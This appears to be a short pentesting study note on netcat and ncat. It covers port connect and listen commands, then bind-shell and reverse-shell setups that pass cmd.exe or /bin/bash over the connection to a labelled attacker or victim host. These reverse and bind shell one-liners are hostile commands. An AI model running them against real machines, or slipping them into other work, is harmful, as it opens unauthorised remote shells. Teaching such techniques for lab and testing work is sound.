---
description: >-
  Purpose? - To establish connections on open ports and create listening ports
  on local machine | REVERSE SHELL Section in development
---

# Netcat/Ncat

#### This tool allows us to bind to a given port of a given IP address. It is of help when trying to send files between machines, developing exploit payloads that would serve a backdoor on a target.

The scope of this document limits to a discussion of how to use [netcat](https://nc110.sourceforge.io/)/[ncat ](https://nmap.org/ncat/)to connect to clients and serve opening ports

#### Connecting vs Listening

To attempt to establish a connection with TCP port:

```bash
nc -nv [destination ip] [destination port]
```

To listen on TCP port:

```text
nc -nvlp 4444
```

## Bind Shell: Attacker connects to a victim on listening PORTS

1. On Windows Machine - set netcat/ncat to listen on 4444/TCP:

   Once Netcat is running 'cmd line:' prompt will appear; we will pass it the command line executable.

   `nc -nvlp 4444 -e cmd.exe`

2. On Linux Machine - set netcat to connect to 4444/TCP:

   `nc -nv 192.168.2.1 4444 -e /bin/bash`

**In the Bind Shell case described in 1 & 2 the Windows machine is the victim that has been set up to listen on 4444/TCP**

## Reverse Shell: Victim connects to attacker on listening PORTS

This is the one you will be using the most

1. On Linux Machine - set netcat to listen on 4444/TCP:

   `nc -nvlp 4444`

2. On Windows Machine - connect to 192.168.2.130 machine on 4444/TCP:

   `C:\nc64.exe`

**Once Netcat is running 'Cmd line:' prompt will appear, using the -e switch, we pass the command line executable "cmd.exe" to the destination host:**

`Cmd line: -nv 192.168.2.130 4444 -e cmd.exe`

## [What is ncat?](https://nmap.org/ncat/)

It's just a modern implementation of netcat by the authors of [nmap](https://nmap.org/). They describe it as: 

"_Ncat is a feature-packed networking utility which reads and writes data across networks from the command line. Ncat was written for the Nmap Project as a much-improved re-implementation of the venerable_ [_Netcat_](http://sectools.org/tool/netcat/)_. It uses both TCP and UDP for communication and is designed to be a reliable back-end tool to instantly provide network connectivity to other applications and users. Ncat will not only work with IPv4 and IPv6 but provides the user with a virtually limitless number of potential uses._"

```groovy
  .       .       
  \`-"'"-'/       
   } 6 6 {        
  ==. Y ,==       
    /^^^\  .      
   /     \  )     
  (  )-(  )/     _
  -""---""---   / 
 /   Ncat    \_/  
(     ____        
 \_.=|____E       
```
